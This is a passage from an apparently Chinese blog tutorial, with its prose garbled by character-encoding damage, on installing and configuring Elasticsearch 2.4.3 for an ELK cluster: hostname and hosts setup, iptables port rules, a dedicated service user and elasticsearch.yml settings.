jdk-8u91-linux-x64.rpm&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;å†æ¬¡ç¡®è®¤å®‰è£…æˆåŠŸ&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;java -version&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&quot;åŸºæœ¬é…ç½®è®¾ç½®FQDNï¼š&quot;&gt;&lt;a href=&quot;#åŸºæœ¬é…ç½®è®¾ç½®FQDNï¼š&quot; class=&quot;headerlink&quot; title=&quot;åŸºæœ¬é…ç½®è®¾ç½®FQDNï¼š&quot;&gt;&lt;/a&gt;åŸºæœ¬é…ç½®è®¾ç½®FQDNï¼š&lt;/h4&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#ä¿®æ”¹hostname&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;cat /etc/hostname&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;es_01&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#ä¿®æ”¹hosts&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;cat /etc/hosts&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;127.0.0.1 localhost localhost.localdomain localhost4 localhost4.localdomain4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;::1 localhost localhost.localdomain localhost6 localhost6.localdomain6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10.47.88.206 es.ihaozhuo.com es_01&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#åˆ·æ–°ç¯å¢ƒ&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;hostname -F /etc/hostname&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#å¤æŸ¥ç»“æœ&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;hostname &lt;span class=&quot;_&quot;&gt;-f&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;es.ihaozhuo.com&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;hostname&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;es_01&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;é˜²ç«å¢™é…ç½®&quot;&gt;&lt;a href=&quot;#é˜²ç«å¢™é…ç½®&quot; class=&quot;headerlink&quot; title=&quot;é˜²ç«å¢™é…ç½®&quot;&gt;&lt;/a&gt;é˜²ç«å¢™é…ç½®&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#service iptables stop&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#setenforce 0&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ä¸è¿‡è¿™é‡Œæˆ‘é˜²ç«å¢™æ˜¯å¼€å¯çš„ï¼ŒåæœŸæ·»åŠ å‡ºå»ç«¯å£å³å¯ã€‚&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;æˆ–è€…å¯ä»¥ä¸å…³é—­é˜²ç«å¢™ï¼Œä½†æ˜¯è¦åœ¨iptablesä¸­æ‰“å¼€ç›¸å…³çš„ç«¯å£ï¼š&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# vim /etc/sysconfig/iptables&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;-A INPUT -m state --state NEW -m tcp -p tcp --dport 80 -j ACCEPT&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;-A INPUT -m state --state NEW -m tcp -p tcp --dport 9200 -j ACCEPT&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;-A INPUT -m state --state NEW -m tcp -p tcp --dport 9292 -j ACCEPT&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# service iptables restart&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&quot;RPMå¿«é€Ÿå®‰è£…&quot;&gt;&lt;a href=&quot;#RPMå¿«é€Ÿå®‰è£…&quot; class=&quot;headerlink&quot; title=&quot;RPMå¿«é€Ÿå®‰è£…&quot;&gt;&lt;/a&gt;RPMå¿«é€Ÿå®‰è£…&lt;/h4&gt;&lt;p&gt;elkæ‰€æœ‰å®‰è£…éƒ½å¯ä»¥ä½¿ç”¨rpmäºŒè¿›åˆ¶åŒ…çš„æ–¹å¼,å¢åŠ &lt;code&gt;elasticå®˜ç½‘&lt;/code&gt;çš„ä»“åº“repoå°±å¯ä»¥ç”¨yumå®‰è£…äº†&lt;/p&gt;
&lt;p&gt;elasticsearchçœ‹è¿™é‡Œ â€”â€“ &lt;a href=&quot;https://www.elastic.co/guide/en/elasticsearch/reference/current/setup-repositories.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;elasticsearch-rpmå®˜æ–¹æ–‡æ¡£&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;logstashçœ‹è¿™é‡Œ â€”-&lt;a href=&quot;https://www.elastic.co/guide/en/logstash/current/installing-logstash.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;logstash-rpmå®˜ç½‘æ–‡æ¡£&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;kibanaçœ‹è¿™é‡Œ â€”&lt;a href=&quot;https://www.elastic.co/guide/en/kibana/current/setup.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;kibana-rpmå®˜ç½‘æ–‡æ¡£&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;es-01æœåŠ¡ç«¯æºç å®‰è£…&quot;&gt;&lt;a href=&quot;#es-01æœåŠ¡ç«¯æºç å®‰è£…&quot; class=&quot;headerlink&quot; title=&quot;es_01æœåŠ¡ç«¯æºç å®‰è£…&quot;&gt;&lt;/a&gt;es_01æœåŠ¡ç«¯æºç å®‰è£…&lt;/h3&gt;&lt;p&gt;è¿™é‡Œæˆ‘æ˜¯æºç å®‰è£…çš„&lt;br&gt;ä¸‹è½½ElasticSearch ElasticSearché»˜è®¤çš„å¯¹å¤–æœåŠ¡çš„HTTPç«¯å£æ˜¯9200ï¼ŒèŠ‚ç‚¹é—´äº¤äº’çš„TCPç«¯å£æ˜¯9300ã€‚&lt;/p&gt;
&lt;p&gt;ä¸‹è½½åœ°å€ï¼š&lt;a href=&quot;https://www.elastic.co/downloads/elasticsearch&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Elasticsearch&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;2.4ç‰ˆæœ¬ï¼š&lt;br&gt;&lt;a href=&quot;https://www.elastic.co/downloads/past-releases/elasticsearch-2-4-3&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Elasticsearch2.4.3&lt;/a&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;è§£å‹æºç åŒ…ï¼š&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@es_01 ~]&lt;span class=&quot;comment&quot;&gt;# tar -zxvf elasticsearch-2.4.3.tar.gz -C /usr/local/&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ç„¶åç»™ç›®å½•åšä¸ªè½¯é“¾æ¥ï¼š&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@es_01 &lt;span class=&quot;built_in&quot;&gt;local&lt;/span&gt;]&lt;span class=&quot;comment&quot;&gt;# ln -s  /usr/local/elasticsearch-2.4.3/ /usr/local/elasticsearch&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;è¿™é‡Œéœ€è¦ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼š&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;é…ç½®å‰å…ˆåˆ›å»ºå‡ ä¸ªç›®å½•æ–‡ä»¶&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;æ–°å»ºç›®å½•, å‡è®¾/data/ç›®å½•æŒ‚è½½çš„ç¡¬ç›˜æœ€å¤§(500Gä»¥ä¸Š)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@es_01 srv]]&lt;span class=&quot;comment&quot;&gt;# mkdir /srv/data/es-data -p&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@es_01 srv]&lt;span class=&quot;comment&quot;&gt;# mkdir /srv/data/es-work &lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@es_01 &lt;span class=&quot;built_in&quot;&gt;local&lt;/span&gt;]&lt;span class=&quot;comment&quot;&gt;# mkdir /usr/local/elasticsearch/logs&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@es_01 &lt;span class=&quot;built_in&quot;&gt;local&lt;/span&gt;]&lt;span class=&quot;comment&quot;&gt;# mkdir /usr/local/elasticsearch/config/plugins&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;æ–°å»ºç”¨æˆ·&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ä¿®æ”¹æºç ç›®å½•å±æ€§å±ç»„ï¼š&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@es_01 elasticsearch]&lt;span class=&quot;comment&quot;&gt;# useradd  -s /sbin/nologin elasticsearch&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@es_01 elasticsearch]&lt;span class=&quot;comment&quot;&gt;# chown -R elasticsearch:elasticsearch /usr/local/elasticsearch&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@es_01 elasticsearch]&lt;span class=&quot;comment&quot;&gt;# chown -R elasticsearch:elasticsearch /srv/data/&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;åˆ‡æ¢ç”¨æˆ·&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;åˆ‡æ¢åˆ°elasticsearchç”¨æˆ·, å¹¶è¿›å…¥elasticsearchç›®å½•&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;su elasticsearch&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;cd&lt;/span&gt; /usr/&lt;span class=&quot;built_in&quot;&gt;local&lt;/span&gt;/elasticsearch/&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;é…ç½®Elasticsearchï¼š&quot;&gt;&lt;a href=&quot;#é…ç½®Elasticsearchï¼š&quot; class=&quot;headerlink&quot; title=&quot;é…ç½®Elasticsearchï¼š&quot;&gt;&lt;/a&gt;é…ç½®Elasticsearchï¼š&lt;/h3&gt;&lt;p&gt;ä»¥ç”¨æˆ·esçš„èº«ä»½è¿›è¡Œæ“ä½œ&lt;/p&gt;
&lt;p&gt;æ–‡ä»¶è·¯å¾„: &lt;code&gt;config/elasticsearch.yml&lt;/code&gt;&lt;br&gt;ä¿®æ”¹è¯¥æ–‡ä»¶ä¸­é…ç½®é¡¹: (æ³¨æ„, åŸå§‹æ–‡ä»¶ä¸­éƒ½æ˜¯è¢«#å·æ³¨é‡Šæ‰äº†, éœ€è¦å»æ‰å¯¹åº”æ³¨é‡Šå¹¶ä¿®æ”¹é…ç½®å€¼)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;é›†ç¾¤å: cluster.name, æ³¨æ„: ä¸¤å°æœºå™¨é…ç½®ä¸€è‡´&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;cluster.name: elk_cluster&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;èŠ‚ç‚¹å: node.name, æ³¨æ„: ä¸¤å°æœºå™¨é…ç½®ä¸åŒ, ä¸€å°ä¸º01, å¦ä¸€å°ä¸º02&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt; &lt;span class=&quot;comment&quot;&gt;# ç¬¬ä¸€å°æœºå™¨&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;node.name: inner_es_node_01&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# ç¬¬äºŒå°æœºå™¨&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;node.name: inner_es_node_02&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;31&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;32&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;33&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;34&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;35&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;36&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;37&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;38&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;39&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;40&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;41&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;42&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;43&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;44&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;45&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;46&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;47&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@es_01 config]&lt;span class=&quot;comment&quot;&gt;# vim elasticsearch.yml&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# Use a descriptive name for your cluster:&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;cluster.name: elk_cluster&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# ------------------------------------ Node ------------------------------------&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# Use a descriptive name for the node:&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;node.name: es_01&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# Add custom attributes to the node:&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# node.rack: r1&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# ----------------------------------- Paths ------------------------------------&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# Path to directory where to store the data (separate multiple locations by comma):&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;path.data: /srv/data/es-data&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# Path to log files:&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;path.logs: /usr/&lt;span class=&quot;built_in&quot;&gt;local&lt;/span&gt;/elasticsearch/logs&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# ----------------------------------- Memory -----------------------------------&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# Lock the memory on startup:&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# bootstrap.memory_lock: true&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# Make sure that the `ES_HEAP_SIZE` environment variable is set to about half the memory&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# available on the system and that the owner of the process is allowed to use this limit.&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# Elasticsearch performs poorly when the system is swapping the memory.&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# ---------------------------------- Network -----------------------------------&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# Set the bind address to a specific IP (IPv4 or IPv6):&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;network.host: 10.47.88.206&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;åˆ‡æ¢åˆ°elasticsearchç”¨æˆ·å¯åŠ¨æœåŠ¡ã€‚&lt;/p&gt;
&lt;p&gt;æºç å®‰è£…å¯åŠ¨éœ€è¦æ‰§è¡Œ ï¼š&lt;code&gt;/usr/local/elasticsearch/bin/elasticsearch &amp;amp;&lt;/code&gt;&lt;br&gt;æ‰èƒ½å¯åŠ¨ï¼›&lt;/p&gt;
